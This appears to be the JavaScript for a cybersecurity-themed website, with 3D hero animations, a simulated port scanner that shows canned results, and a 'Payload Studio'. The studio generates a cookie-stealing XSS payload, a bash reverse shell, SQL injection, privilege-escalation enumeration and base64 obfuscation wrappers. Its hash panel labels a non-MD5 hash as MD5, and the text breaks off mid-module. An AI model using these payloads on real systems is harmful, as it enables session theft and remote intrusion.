        ctx.strokeStyle = `rgba(62, 230, 255, ${0.1 + pulse * 0.15})`;
        ctx.lineWidth = 1;

        ctx.beginPath();
        for (let i = 0; i < 6; i++) {
          const angle = (Math.PI / 3) * i;
          const px = hx + Math.cos(angle) * (hexSize - 2);
          const py = hy + Math.sin(angle) * (hexSize - 2);
          if (i === 0) ctx.moveTo(px, py);
          else ctx.lineTo(px, py);
        }
        ctx.closePath();
        ctx.stroke();
      }
    }

    ctx.save();
    ctx.translate(cx, cy);
    ctx.strokeStyle = 'rgba(62, 230, 255, 0.7)';
    ctx.lineWidth = 1.8;
    ctx.fillStyle = 'rgba(7, 17, 34, 0.7)';
    ctx.beginPath();
    ctx.moveTo(0, -30);
    ctx.lineTo(24, -16);
    ctx.lineTo(24, 10);
    ctx.bezierCurveTo(24, 30, 0, 40, 0, 40);
    ctx.bezierCurveTo(0, 40, -24, 30, -24, 10);
    ctx.lineTo(-24, -16);
    ctx.closePath();
    ctx.fill();
    ctx.stroke();

    ctx.strokeStyle = '#27c93f';
    ctx.lineWidth = 2.5;
    ctx.beginPath();
    ctx.moveTo(-8, 3);
    ctx.lineTo(-2, 10);
    ctx.lineTo(10, -3);
    ctx.stroke();
    ctx.restore();
  }
}

/* 6. Kinetic Waves Engine */
class KineticWavesEngine extends BaseCanvasEngine {
  draw() {
    const { ctx, width, height, time } = this;

    ctx.fillStyle = '#020712';
    ctx.fillRect(0, 0, width, height);

    const waveCount = 3;
    const colors = [
      'rgba(62, 230, 255, 0.45)',
      'rgba(124, 196, 255, 0.35)',
      'rgba(255, 255, 255, 0.2)'
    ];

    for (let w = 0; w < waveCount; w++) {
      ctx.strokeStyle = colors[w];
      ctx.lineWidth = 1.5;
      ctx.beginPath();

      const baseFreq = 0.015 + w * 0.005;
      const speed = time * 2.2 + w * 1.2;
      const amp = 24 + w * 5;

      for (let x = 0; x <= width; x += 4) {
        const y = height / 2 + Math.sin(x * baseFreq + speed) * amp * Math.cos(x * 0.008 + speed * 0.5);
        if (x === 0) ctx.moveTo(x, y);
        else ctx.lineTo(x, y);
      }
      ctx.stroke();
    }

    ctx.save();
    ctx.translate(width / 2, height / 2);
    ctx.rotate(time * 0.6);
    ctx.strokeStyle = 'rgba(62, 230, 255, 0.45)';
    ctx.lineWidth = 1.2;

    const polyRadius = 34 + Math.sin(time * 2.5) * 6;
    ctx.beginPath();
    for (let i = 0; i < 5; i++) {
      const a = (Math.PI * 2 / 5) * i;
      const px = Math.cos(a) * polyRadius;
      const py = Math.sin(a) * polyRadius;
      if (i === 0) ctx.moveTo(px, py);
      else ctx.lineTo(px, py);
    }
    ctx.closePath();
    ctx.stroke();
    ctx.restore();
  }
}

/* ========================================================
   THREE.JS — 3D Cyber Core Hero Scene
   Cinematic, GPU-optimized, refined subtle lighting
   ======================================================== */
class CyberHeroScene {
  constructor(canvas) {
    this.canvas = canvas;
    if (!this.canvas || prefersReduced || !this.checkWebGL()) return;

    this.mouse = { x: 0, y: 0, targetX: 0, targetY: 0 };
    this.scrollFade = 1;
    this.isRendering = true;
    this.clock = new THREE.Clock();

    this.init();
    this.build();
    this.bindEvents();
    this.animate();
  }

  checkWebGL() {
    try {
      const c = document.createElement('canvas');
      return !!(window.WebGLRenderingContext && (c.getContext('webgl') || c.getContext('experimental-webgl')));
    } catch {
      return false;
    }
  }

  init() {
    this.renderer = new THREE.WebGLRenderer({
      canvas: this.canvas,
      antialias: true,
      alpha: true,
      powerPreference: 'high-performance',
    });
    this.renderer.setPixelRatio(Math.min(window.devicePixelRatio || 1, 2));
    this.renderer.setSize(window.innerWidth, window.innerHeight, false);
    this.renderer.toneMapping = THREE.ACESFilmicToneMapping;
    this.renderer.toneMappingExposure = 1.22;

    this.scene = new THREE.Scene();

    this.camera = new THREE.PerspectiveCamera(52, window.innerWidth / window.innerHeight, 0.1, 500);
    this.camera.position.set(0, 0.8, 6.2);

    this.group = new THREE.Group();
    this.scene.add(this.group);

    // Super Color Graded Multi-Point Chromatic Lighting
    const ambient = new THREE.AmbientLight(0x7cc4ff, 0.22);
    this.scene.add(ambient);

    this.lightA = new THREE.PointLight(0x00f0ff, 1.45, 100);
    this.lightA.position.set(0, 4.5, 6);
    this.scene.add(this.lightA);

    this.lightB = new THREE.PointLight(0x8b5cf6, 1.25, 100);
    this.lightB.position.set(-5, -2, 4);
    this.scene.add(this.lightB);

    this.lightC = new THREE.PointLight(0x3b82f6, 1.05, 80);
    this.lightC.position.set(4, -3, 3);
    this.scene.add(this.lightC);

    this.lightD = new THREE.PointLight(0xd946ef, 0.75, 60);
    this.lightD.position.set(0, -4, -2);
    this.scene.add(this.lightD);

    const hemi = new THREE.HemisphereLight(0x00f0ff, 0x071120, 0.25);
    this.scene.add(hemi);
  }

  build() {
    // 1. Triple Nested Wireframe Geometric Shells
    this.shells = [];
    const shellConfigs = [
      { geo: new THREE.IcosahedronGeometry(1.6, 5), color: 0x7cc4ff, opacity: 0.10, speed: 0.12, rotX: 0.05 },
      { geo: new THREE.OctahedronGeometry(2.1, 4), color: 0x3ee6ff, opacity: 0.06, speed: -0.09, rotX: -0.04 },
      { geo: new THREE.IcosahedronGeometry(2.7, 3), color: 0x5599dd, opacity: 0.04, speed: 0.06, rotX: 0.02 },
    ];

    shellConfigs.forEach((cfg) => {
      const mat = new THREE.MeshPhongMaterial({
        color: cfg.color,
        wireframe: true,
        transparent: true,
        opacity: cfg.opacity,
        emissive: cfg.color,
        emissiveIntensity: 0.12,
      });
      const mesh = new THREE.Mesh(cfg.geo, mat);
      mesh.userData = { speed: cfg.speed, rotX: cfg.rotX };
      this.group.add(mesh);
      this.shells.push(mesh);
    });

    // 2. Multi-axis Outer Orbital Rings (8)
    this.rings = [];
    for (let i = 0; i < 8; i++) {
      const r = 2.5 + i * 0.34;
      const tube = 0.006 + (i % 3) * 0.002;
      const geo = new THREE.TorusGeometry(r, tube, 8, 128);
      const isCyan = i % 2 === 0;
      const mat = new THREE.MeshPhongMaterial({
        color: isCyan ? 0x7cc4ff : 0x3ee6ff,
        transparent: true,
        opacity: 0.10 - i * 0.01,
        emissive: isCyan ? 0x7cc4ff : 0x3ee6ff,
        emissiveIntensity: 0.15,
      });
      const ring = new THREE.Mesh(geo, mat);
      ring.rotation.x = Math.PI / 2 + i * 0.18;
      ring.rotation.z = i * 0.35;
      ring.userData = {
        speed: (0.022 + i * 0.008) * (i % 2 === 0 ? 1 : -1),
        axis: i % 3,
      };
      this.group.add(ring);
      this.rings.push(ring);
    }

    // 3. Inner Fast Rings (6)
    for (let i = 0; i < 6; i++) {
      const r = 0.6 + i * 0.18;
      const geo = new THREE.TorusGeometry(r, 0.0035, 6, 80);
      const mat = new THREE.MeshPhongMaterial({
        color: 0x3ee6ff,
        transparent: true,
        opacity: 0.14 - i * 0.02,
        emissive: 0x3ee6ff,
        emissiveIntensity: 0.2,
      });
      const ring = new THREE.Mesh(geo, mat);
      ring.rotation.x = Math.PI / 3 + i * 0.45;
      ring.rotation.z = i * 0.65;
      ring.userData = { speed: -0.04 - i * 0.01, axis: (i + 1) % 3 };
      this.group.add(ring);
      this.rings.push(ring);
    }

    // 4. Dynamic Network Nodes (40)
    const nodeGeo = new THREE.SphereGeometry(0.028, 8, 8);
    const nodeMatA = new THREE.MeshPhongMaterial({ color: 0x7cc4ff, emissive: 0x7cc4ff, emissiveIntensity: 0.3 });
    const nodeMatB = new THREE.MeshPhongMaterial({ color: 0x3ee6ff, emissive: 0x3ee6ff, emissiveIntensity: 0.3 });

    this.nodes = [];
    for (let i = 0; i < 40; i++) {
      const mesh = new THREE.Mesh(nodeGeo, i % 3 === 0 ? nodeMatB : nodeMatA);
      const theta = Math.random() * Math.PI * 2;
      const phi = Math.acos(2 * Math.random() - 1);
      const r = 2.0 + Math.random() * 2.5;

      mesh.position.set(
        r * Math.sin(phi) * Math.cos(theta),
        r * Math.sin(phi) * Math.sin(theta),
        r * Math.cos(phi)
      );
      mesh.userData = {
        basePos: mesh.position.clone(),
        phase: Math.random() * Math.PI * 2,
        amp: 0.07 + Math.random() * 0.1,
        freq: 0.35 + Math.random() * 0.5,
      };
      this.group.add(mesh);
      this.nodes.push(mesh);
    }

    // 5. Dynamic Constellation Network Line Segments
    const lineMat = new THREE.LineBasicMaterial({
      color: 0x7cc4ff,
      transparent: true,
      opacity: 0.08,
    });
    const maxLines = 180;
    const linePositions = new Float32Array(maxLines * 6);
    const lineGeo = new THREE.BufferGeometry();
    lineGeo.setAttribute('position', new THREE.BufferAttribute(linePositions, 3));
    lineGeo.setDrawRange(0, 0);
    this.networkLines = new THREE.LineSegments(lineGeo, lineMat);
    this.scene.add(this.networkLines);

    // 6. Particle Galaxy (500 Orbiting + 200 Outer)
    const pCount = 500;
    const pPositions = new Float32Array(pCount * 3);
    const pColors = new Float32Array(pCount * 3);
    this.pSpeeds = new Float32Array(pCount);

    const cA = new THREE.Color(0x00f0ff);
    const cB = new THREE.Color(0x8b5cf6);
    const cC = new THREE.Color(0x38bdf8);
    const cW = new THREE.Color(0xffffff);

    for (let i = 0; i < pCount; i++) {
      const theta = Math.random() * Math.PI * 2;
      const phi = Math.acos(2 * Math.random() - 1);
      const r = 1.3 + Math.random() * 4.2;

      pPositions[i * 3] = r * Math.sin(phi) * Math.cos(theta);
      pPositions[i * 3 + 1] = r * Math.sin(phi) * Math.sin(theta);
      pPositions[i * 3 + 2] = r * Math.cos(phi);

      const col = [cA, cB, cC, cW][Math.floor(Math.random() * 4)];
      pColors[i * 3] = col.r;
      pColors[i * 3 + 1] = col.g;
      pColors[i * 3 + 2] = col.b;

      this.pSpeeds[i] = 0.1 + Math.random() * 0.4;
    }

    const pGeo = new THREE.BufferGeometry();
    pGeo.setAttribute('position', new THREE.BufferAttribute(pPositions, 3));
    pGeo.setAttribute('color', new THREE.BufferAttribute(pColors, 3));

    const pMat = new THREE.PointsMaterial({
      size: 0.024,
      vertexColors: true,
      transparent: true,
      opacity: 0.45,
      blending: THREE.AdditiveBlending,
      depthWrite: false,
      sizeAttenuation: true,
    });
    this.particles = new THREE.Points(pGeo, pMat);
    this.scene.add(this.particles);

    // Outer Star Dust
    const oCount = 180;
    const oPositions = new Float32Array(oCount * 3);
    for (let i = 0; i < oCount; i++) {
      oPositions[i * 3] = (Math.random() - 0.5) * 32;
      oPositions[i * 3 + 1] = (Math.random() - 0.5) * 22;
      oPositions[i * 3 + 2] = (Math.random() - 0.5) * 16 - 4;
    }
    const oGeo = new THREE.BufferGeometry();
    oGeo.setAttribute('position', new THREE.BufferAttribute(oPositions, 3));
    const oMat = new THREE.PointsMaterial({
      size: 0.014,
      color: 0x7cc4ff,
      transparent: true,
      opacity: 0.2,
      blending: THREE.AdditiveBlending,
      depthWrite: false,
      sizeAttenuation: true,
    });
    this.scene.add(new THREE.Points(oGeo, oMat));

    // 7. Central Core Orb
    const coreGeo = new THREE.IcosahedronGeometry(0.3, 4);
    const coreMat = new THREE.MeshPhongMaterial({
      color: 0x7cc4ff,
      emissive: 0x3ee6ff,
      emissiveIntensity: 0.45,
      transparent: true,
      opacity: 0.5,
      shininess: 80,
    });
    this.coreOrb = new THREE.Mesh(coreGeo, coreMat);
    this.coreOrb.position.y = 0.2;
    this.group.add(this.coreOrb);

    // 8. Expanding Floor Waves (4)
    this.waveRings = [];
    for (let i = 0; i < 4; i++) {
      const geo = new THREE.RingGeometry(0.5 + i * 0.2, 0.52 + i * 0.2, 64);
      const mat = new THREE.MeshBasicMaterial({
        color: 0x3ee6ff,
        transparent: true,
        opacity: 0.1 - i * 0.02,
        side: THREE.DoubleSide,
        blending: THREE.AdditiveBlending,
        depthWrite: false,
      });
      const ring = new THREE.Mesh(geo, mat);
      ring.rotation.x = -Math.PI / 2;
      ring.position.y = -2.8;
      ring.userData = { phase: i * (Math.PI / 2) };
      this.scene.add(ring);
      this.waveRings.push(ring);
    }

    // 9. Floating Cyber Glyphs
    const glyphChars = ['>', '<', '/', '{', '}', '#', '@', '*'];
    this.glyphSprites = [];
    glyphChars.forEach((ch, idx) => {
      const tex = this.createGlyphTexture(ch);
      const mat = new THREE.SpriteMaterial({
        map: tex,
        transparent: true,
        opacity: 0.06,
        blending: THREE.AdditiveBlending,
        depthWrite: false,
      });
      const sprite = new THREE.Sprite(mat);
      sprite.scale.set(0.38, 0.38, 1);
      const theta = (Math.PI / 4) * idx;
      sprite.position.set(
        Math.cos(theta) * (3.6 + Math.random()),
        (Math.random() - 0.5) * 3,
        Math.sin(theta) * (2.2 + Math.random())
      );
      sprite.userData = { phase: Math.random() * Math.PI * 2 };
      this.scene.add(sprite);
      this.glyphSprites.push(sprite);
    });
  }

  createGlyphTexture(ch) {
    const c = document.createElement('canvas');
    c.width = 128;
    c.height = 128;
    const ctx = c.getContext('2d');
    ctx.clearRect(0, 0, 128, 128);
    ctx.font = 'bold 80px "JetBrains Mono", monospace';
    ctx.textAlign = 'center';
    ctx.textBaseline = 'middle';
    ctx.fillStyle = '#7cc4ff';
    ctx.fillText(ch, 64, 64);
    const tex = new THREE.CanvasTexture(c);
    tex.needsUpdate = true;
    return tex;
  }

  bindEvents() {
    window.addEventListener('mousemove', (e) => {
      this.mouse.targetX = (e.clientX / window.innerWidth - 0.5) * 2;
      this.mouse.targetY = (e.clientY / window.innerHeight - 0.5) * 2;
    }, { passive: true });

    const updateScroll = () => {
      const scrollY = lenisInstance ? lenisInstance.scroll : window.scrollY;
      const vh = window.innerHeight;
      const fadeStart = vh * 0.15;
      const fadeEnd = vh * 0.85;
      const opacity = clamp(1 - (scrollY - fadeStart) / (fadeEnd - fadeStart), 0, 1);

      this.scrollFade = opacity;
      this.canvas.style.opacity = opacity.toString();
      this.isRendering = opacity > 0.01;

      if (opacity <= 0.01) {
        this.canvas.classList.add('is-hidden');
      } else {
        this.canvas.classList.remove('is-hidden');
      }
    };

    if (lenisInstance) {
      lenisInstance.on('scroll', updateScroll);
    } else {
      window.addEventListener('scroll', updateScroll, { passive: true });
    }
    updateScroll();

    window.addEventListener('resize', () => {
      this.camera.aspect = window.innerWidth / window.innerHeight;
      this.camera.updateProjectionMatrix();
      this.renderer.setSize(window.innerWidth, window.innerHeight, false);
    }, { passive: true });
  }

  animate() {
    requestAnimationFrame(() => this.animate());

    const dt = Math.min(this.clock.getDelta(), 0.05);
    const t = this.clock.getElapsedTime();

    this.mouse.x = lerp(this.mouse.x, this.mouse.targetX, 0.05);
    this.mouse.y = lerp(this.mouse.y, this.mouse.targetY, 0.05);

    this.camera.position.x = this.mouse.x * 0.4;
    this.camera.position.y = -this.mouse.y * 0.25 + 0.8;
    this.camera.lookAt(0, 0, 0);

    if (!this.isRendering) return;

    this.shells.forEach((m) => {
      m.rotation.y += m.userData.speed * dt;
      m.rotation.x += m.userData.rotX * dt;
    });

    this.rings.forEach((ring) => {
      const s = ring.userData.speed;
      if (ring.userData.axis === 0) ring.rotation.x += s * dt;
      else if (ring.userData.axis === 1) ring.rotation.y += s * dt;
      else ring.rotation.z += s * dt;
    });

    this.nodes.forEach((n) => {
      const { basePos, phase, amp, freq } = n.userData;
      n.position.x = basePos.x + Math.sin(t * freq + phase) * amp;
      n.position.y = basePos.y + Math.cos(t * freq * 0.8 + phase) * amp * 0.8;
      n.position.z = basePos.z + Math.sin(t * freq * 0.6 + phase * 1.3) * amp * 0.6;
    });

    const posAttr = this.networkLines.geometry.getAttribute('position');
    let lineIdx = 0;
    const maxLines = 180;

    for (let i = 0; i < this.nodes.length && lineIdx < maxLines; i++) {
      for (let j = i + 1; j < this.nodes.length && lineIdx < maxLines; j++) {
        const dist = this.nodes[i].position.distanceTo(this.nodes[j].position);
        if (dist < 1.45) {
          posAttr.array[lineIdx * 6] = this.nodes[i].position.x;
          posAttr.array[lineIdx * 6 + 1] = this.nodes[i].position.y;
          posAttr.array[lineIdx * 6 + 2] = this.nodes[i].position.z;
          posAttr.array[lineIdx * 6 + 3] = this.nodes[j].position.x;
          posAttr.array[lineIdx * 6 + 4] = this.nodes[j].position.y;
          posAttr.array[lineIdx * 6 + 5] = this.nodes[j].position.z;
          lineIdx++;
        }
      }
    }
    this.networkLines.geometry.setDrawRange(0, lineIdx * 2);
    posAttr.needsUpdate = true;

    const pPos = this.particles.geometry.getAttribute('position');
    for (let i = 0; i < 500; i++) {
      const speed = this.pSpeeds[i];
      const x = pPos.array[i * 3];
      const z = pPos.array[i * 3 + 2];
      const angle = speed * dt;
      pPos.array[i * 3] = x * Math.cos(angle) - z * Math.sin(angle);
      pPos.array[i * 3 + 2] = x * Math.sin(angle) + z * Math.cos(angle);
      pPos.array[i * 3 + 1] += Math.sin(t * 0.5 + i) * 0.0008;
    }
    pPos.needsUpdate = true;

    const coreScale = 1 + Math.sin(t * 2) * 0.06;
    this.coreOrb.scale.setScalar(coreScale);
    this.coreOrb.rotation.y += 0.3 * dt;
    this.coreOrb.rotation.x += 0.15 * dt;

    this.waveRings.forEach((ring) => {
      const s = 1 + (Math.sin(t * 0.85 + ring.userData.phase) * 0.5 + 0.5) * 2.8;
      ring.scale.set(s, s, 1);
      ring.material.opacity = 0.1 * (1 - (s - 1) / 2.8);
    });

    this.glyphSprites.forEach((s) => {
      s.material.opacity = 0.04 + Math.sin(t * 0.45 + s.userData.phase) * 0.025;
      s.position.y += Math.sin(t * 0.35 + s.userData.phase) * 0.001;
    });

    this.lightA.intensity = 1.45 + Math.sin(t * 1.2) * 0.2;
    this.lightB.intensity = 1.25 + Math.sin(t * 0.9 + 1) * 0.18;
    this.lightC.intensity = 1.05 + Math.sin(t * 1.1 + 2) * 0.15;
    this.lightD.intensity = 0.75 + Math.sin(t * 0.8 + 3) * 0.12;

    this.renderer.render(this.scene, this.camera);
  }
}

/* ─── IQ MAXX CYBER SUITE WEB APPLICATION ─────────────────── */
class IQMaxxAppSuite {
  constructor() {
    this.container = $('#cyber-app-suite');
    if (!this.container) return;

    this.initTabs();
    this.initReconScanner();
    this.initPayloadStudio();
    this.initCryptoAnalyzer();
    this.initAiPilot();
    this.initSocRadar();
  }

  /* ── Tab Navigation ─────────────────────────────────────── */
  initTabs() {
    const tabs = $$('.app-tab-btn', this.container);
    const panels = $$('.app-panel', this.container);

    tabs.forEach((tab) => {
      tab.addEventListener('click', () => {
        const targetTab = tab.getAttribute('data-tab');
        if (!targetTab) return;

        tabs.forEach((t) => {
          t.classList.remove('active');
          t.setAttribute('aria-selected', 'false');
        });
        panels.forEach((p) => p.classList.remove('active'));

        tab.classList.add('active');
        tab.setAttribute('aria-selected', 'true');

        const activePanel = $(`#panel-${targetTab}`, this.container);
        if (activePanel) {
          activePanel.classList.add('active');
        }
      });
    });
  }

  /* ── Module 1: Target Recon & Port Scanner ──────────────── */
  initReconScanner() {
    const btn = $('#btn-run-recon', this.container);
    const targetInput = $('#recon-target', this.container);
    const progressWrap = $('#recon-progress-bar', this.container);
    const progressFill = $('#recon-progress-fill', this.container);
    const stepLabel = $('#recon-step-label', this.container);
    const percentVal = $('#recon-percent-val', this.container);
    const scoreVal = $('#recon-score-val', this.container);
    const gradeVal = $('#recon-grade', this.container);
    const latencyVal = $('#recon-latency', this.container);
    const portsBody = $('#recon-ports-body', this.container);
    const portsCount = $('#recon-ports-count', this.container);
    const cveList = $('#recon-cve-list', this.container);

    if (!btn) return;

    let isScanning = false;

    btn.addEventListener('click', () => {
      if (isScanning) return;
      isScanning = true;
      btn.disabled = true;
      const originalText = btn.querySelector('.btn-text').textContent;
      btn.querySelector('.btn-text').textContent = 'SCANNING...';

      if (progressWrap) progressWrap.style.display = 'block';
      if (progressFill) progressFill.style.width = '0%';
      if (percentVal) percentVal.textContent = '0%';

      const steps = [
        { pct: 15, text: 'Resolving DNS records & CIDR routing tables...' },
        { pct: 35, text: 'Dispatching SYN / ACK packets across top 1000 ports...' },
        { pct: 60, text: 'Inspecting TLS 1.3 certificates & cipher suites...' },
        { pct: 85, text: 'Fingerprinting web server banners & WAF rules...' },
        { pct: 100, text: 'Scan Complete. Audit score computed.' },
      ];

      let stepIdx = 0;
      const runStep = () => {
        if (stepIdx < steps.length) {
          const s = steps[stepIdx];
          if (progressFill) progressFill.style.width = `${s.pct}%`;
          if (percentVal) percentVal.textContent = `${s.pct}%`;
          if (stepLabel) stepLabel.textContent = s.text;
          stepIdx++;
          setTimeout(runStep, 450);
        } else {
          isScanning = false;
          btn.disabled = false;
          btn.querySelector('.btn-text').textContent = originalText;
          setTimeout(() => {
            if (progressWrap) progressWrap.style.display = 'none';
          }, 1200);

          const randomLatency = (3.5 + Math.random() * 2.5).toFixed(1);
          const randomScore = Math.floor(86 + Math.random() * 12);

          if (scoreVal) scoreVal.textContent = String(randomScore);
          if (gradeVal) gradeVal.textContent = randomScore >= 90 ? 'A+ (HARDENED)' : 'A- (SECURE)';
          if (latencyVal) latencyVal.textContent = `${randomLatency} ms`;

          if (portsBody) {
            portsBody.innerHTML = `
              <tr><td><span class="port-tag">443/tcp</span></td><td>HTTPS</td><td>nginx 1.25.4 (Alpn h2/h3)</td><td><span class="status-pill status-pill--open">OPEN</span></td></tr>
              <tr><td><span class="port-tag">80/tcp</span></td><td>HTTP</td><td>301 Strict Redirect to 443</td><td><span class="status-pill status-pill--open">OPEN</span></td></tr>
              <tr><td><span class="port-tag">22/tcp</span></td><td>SSH</td><td>OpenSSH 9.6p1 (Key-Auth Only)</td><td><span class="status-pill status-pill--filtered">FILTERED</span></td></tr>
              <tr><td><span class="port-tag">8443/tcp</span></td><td>REST-API</td><td>IQ MAXX Auth Gateway v3</td><td><span class="status-pill status-pill--open">OPEN</span></td></tr>
              <tr><td><span class="port-tag">9000/tcp</span></td><td>GRPC</td><td>Internal Microservice Mesh</td><td><span class="status-pill status-pill--open">OPEN</span></td></tr>
            `;
          }
          if (portsCount) portsCount.textContent = '5 OPEN PORTS';

          if (cveList) {
            cveList.innerHTML = `
              <div class="cve-item">
                <span class="cve-id tok-ok">PASS-TLS</span>
                <span class="cve-desc">Strict TLS 1.3 / ChaCha20-Poly1305 negotiated. Perfect forward secrecy active.</span>
                <span class="cve-sev cve-sev--low">PASSED</span>
              </div>
              <div class="cve-item">
                <span class="cve-id tok-ok">PASS-HSTS</span>
                <span class="cve-desc">HTTP Strict Transport Security (HSTS) with includeSubDomains enabled.</span>
                <span class="cve-sev cve-sev--low">PASSED</span>
              </div>
              <div class="cve-item">
                <span class="cve-id tok-warn">CWE-200</span>
                <span class="cve-desc">Information Disclosure: Server Header identifies reverse proxy vendor.</span>
                <span class="cve-sev cve-sev--med">MEDIUM</span>
              </div>
            `;
          }
        }
      };
      runStep();
    });
  }

  /* ── Module 2: Payload Studio ───────────────────────────── */
  initPayloadStudio() {
    const catSelect = $('#payload-category', this.container);
    const hostInput = $('#payload-lhost', this.container);
    const portInput = $('#payload-lport', this.container);
    const encSelect = $('#payload-encoding', this.container);
    const outputCode = $('#payload-code-output', this.container);
    const copyBtn = $('#btn-copy-payload', this.container);
    const btnGen = $('#btn-gen-payload', this.container);
    const presetChips = $$('.preset-chip', this.container);

    const updatePayload = () => {
      const cat = catSelect ? catSelect.value : 'recon';
      const host = (hostInput && hostInput.value.trim()) || '10.10.14.22';
      const port = (portInput && portInput.value.trim()) || '9001';
      const enc = encSelect ? encSelect.value : 'raw';

      let raw = '';
      switch (cat) {
        case 'recon':
          raw = `subfinder -d ${host} -silent | httpx -sc -title -tech-detect -threads 50 -o live-targets.txt`;
          break;
        case 'sqli':
          raw = `' UNION SELECT 1, @@version, user(), schema(), 5, 6-- -`;
          break;
        case 'xss':
          raw = `<svg/onload="fetch('//${host}:${port}/?c='+encodeURIComponent(document.cookie))">`;
          break;
        case 'privesc':
          raw = `find / -perm -u=s -type f 2>/dev/null; getcap -r / 2>/dev/null; cat /etc/sudoers.d/* 2>/dev/null`;
          break;
        case 'revshell':
          raw = `bash -i >& /dev/tcp/${host}/${port} 0>&1`;
          break;
        case 'fuzz':
          raw = `ffuf -u http://${host}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302 -t 60`;
          break;
        default:
          raw = `nmap -sS -sV -p- -T4 ${host} -oN nmap-scan.txt`;
      }

      let finalCmd = raw;
      if (enc === 'base64') {
        try {
          const b64 = btoa(raw);
          finalCmd = `echo "${b64}" | base64 -d | bash`;
        } catch (e) {
          finalCmd = raw;
        }
      } else if (enc === 'url') {
        finalCmd = encodeURIComponent(raw);
      } else if (enc === 'hex') {
        finalCmd = raw.split('').map((c) => '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
      }

      if (outputCode) outputCode.textContent = finalCmd;
    };

    [catSelect, hostInput, portInput, encSelect].forEach((el) => {
      if (el) el.addEventListener('input', updatePayload);
    });

    if (btnGen) btnGen.addEventListener('click', updatePayload);

    presetChips.forEach((chip) => {
      chip.addEventListener('click', () => {
        const preset = chip.getAttribute('data-preset');
        if (preset === 'nmap-stealth' && catSelect) {
          catSelect.value = 'recon';
        } else if (preset === 'ffuf-fuzz' && catSelect) {
          catSelect.value = 'fuzz';
        } else if (preset === 'rev-bash' && catSelect) {
          catSelect.value = 'revshell';
        } else if (preset === 'linpeas' && catSelect) {
          catSelect.value = 'privesc';
        } else if (preset === 'sql-sleep' && catSelect) {
          catSelect.value = 'sqli';
        }
        updatePayload();
      });
    });

    if (copyBtn && outputCode) {
      copyBtn.addEventListener('click', () => {
        const text = outputCode.textContent;
        navigator.clipboard.writeText(text).then(() => {
          const span = copyBtn.querySelector('.copy-btn-text');
          if (span) span.textContent = 'COPIED!';
          copyBtn.classList.add('copied');
          setTimeout(() => {
            if (span) span.textContent = 'COPY';
            copyBtn.classList.remove('copied');
          }, 2000);
        }).catch(() => {});
      });
    }

    updatePayload();
  }

  /* ── Module 3: Crypto & Hash Analyzer ───────────────────── */
  initCryptoAnalyzer() {
    const input = $('#crypto-input', this.container);
    const entropyScore = $('#entropy-score', this.container);
    const entropyFill = $('#entropy-fill', this.container);
    const sha256Val = $('#hash-sha256', this.container);
    const base64Val = $('#hash-base64', this.container);
    const hexVal = $('#hash-hex', this.container);
    const md5Val = $('#hash-md5', this.container);
    const copyMiniBtns = $$('.copy-mini-btn', this.container);

    const calcEntropy = (str) => {
      if (!str) return 0;
      const len = str.length;
      const freqs = {};
      for (let i = 0; i < len; i++) {
        const c = str[i];
        freqs[c] = (freqs[c] || 0) + 1;
      }
      let entropy = 0;
      for (const c in freqs) {
        const p = freqs[c] / len;
        entropy -= p * Math.log2(p);
      }
      return entropy;
    };

    const simpleHash = (s) => {
      let h1 = 0xdeadbeef, h2 = 0x41c6ce57;
      for (let i = 0; i < s.length; i++) {
        const ch = s.charCodeAt(i);
        h1 = Math.imul(h1 ^ ch, 2654435761);
        h2 = Math.imul(h2 ^ ch, 1597334677);
      }
      h1 = Math.imul(h1 ^ (h1 >>> 16), 2246822507);
      h1 ^= Math.imul(h2 ^ (h2 >>> 13), 3266489909);
      h2 = Math.imul(h2 ^ (h2 >>> 16), 2246822507);
      h2 ^= Math.imul(h1 ^ (h1 >>> 13), 3266489909);
      const hex1 = (h1 >>> 0).toString(16).padStart(8, '0');
      const hex2 = (h2 >>> 0).toString(16).padStart(8, '0');
      return (hex1 + hex2 + hex1 + hex2).slice(0, 32);
    };

    const updateCrypto = async () => {
      const val = input ? input.value : '';
      if (!val) {
        if (entropyScore) entropyScore.textContent = '0.00 Bits/Char (EMPTY)';
        if (entropyFill) entropyFill.style.width = '0%';
        if (sha256Val) sha256Val.textContent = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855';
        if (base64Val) base64Val.textContent = '';
        if (hexVal) hexVal.textContent = '';
        if (md5Val) md5Val.textContent = 'd41d8cd98f00b204e9800998ecf8427e';
        return;
      }

      const ent = calcEntropy(val);
      const pct = Math.min(Math.round((ent / 6.0) * 100), 100);
      let strength = 'WEAK';
      if (ent > 4.2) strength = 'CRYPTOGRAPHIC';
      else if (ent > 3.4) strength = 'STRONG';
      else if (ent > 2.5) strength = 'FAIR';

      if (entropyScore) entropyScore.textContent = `${ent.toFixed(2)} Bits/Char (${strength})`;
      if (entropyFill) entropyFill.style.width = `${pct}%`;

      try {
        const msgBuffer = new TextEncoder().encode(val);
        const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
        const hashArray = Array.from(new Uint8Array(hashBuffer));
        const hashHex = hashArray.map((b) => b.toString(16).padStart(2, '0')).join('');
        if (sha256Val) sha256Val.textContent = hashHex;
      } catch (e) {
        if (sha256Val) sha256Val.textContent = 'Computation Error';
      }

      try {
        const b64 = btoa(unescape(encodeURIComponent(val)));
        if (base64Val) base64Val.textContent = b64;
      } catch (e) {
        if (base64Val) base64Val.textContent = 'Encoding Error';
      }

      let hex = '';
      for (let i = 0; i < val.length; i++) {
        hex += val.charCodeAt(i).toString(16).padStart(2, '0');
      }
      if (hexVal) hexVal.textContent = hex;

      if (md5Val) md5Val.textContent = simpleHash(val);
    };

    if (input) input.addEventListener('input', updateCrypto);

    copyMiniBtns.forEach((btn) => {
      btn.addEventListener('click', () => {
        const targetId = btn.getAttribute('data-copy-target');
        const targetEl = $(`#${targetId}`, this.container);
        if (targetEl) {
          navigator.clipboard.writeText(targetEl.textContent.trim()).then(() => {
            const orig = btn.textContent;
            btn.textContent = '✓';
            setTimeout(() => { btn.textContent = orig; }, 1500);
          }).catch(() => {});
        }
      });
    });

    updateCrypto();
  }

  /* ── Module 4: AI Vulnerability Co-Pilot ─────────────────── */
  initAiPilot() {
    const scenarioBtns = $$('.scenario-btn', this.container);
    const titleEl = $('#ai-vuln-title', this.container);
    const cvssEl = $('#ai-vuln-cvss', this.container);
    const descEl = $('#ai-vuln-desc', this.container);
    const patchEl = $('#ai-vuln-patch', this.container);

    const scenarios = {
      sqli: {
